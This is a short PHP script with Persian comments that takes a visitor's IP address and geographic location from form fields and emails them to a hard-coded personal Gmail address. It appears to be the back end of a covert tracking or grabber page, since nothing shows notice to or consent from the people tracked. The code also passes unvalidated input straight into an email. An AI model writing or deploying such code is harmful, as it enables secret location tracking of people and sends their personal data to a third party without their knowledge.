<?php
$ip = $_POST['ip']; // دریافت آی‌پی
$location = $_POST['location']; // دریافت موقعیت جغرافیایی

// ارسال اطلاعات به ایمیل
$to = "matinparhiz88@gmail.com";
$subject = "New User Information";
$message = "IP Address: " . $ip . "\nLocation: " . $location;
$headers = "From: yourwebsite@example.com";

mail($to, $subject, $message, $headers);

?>
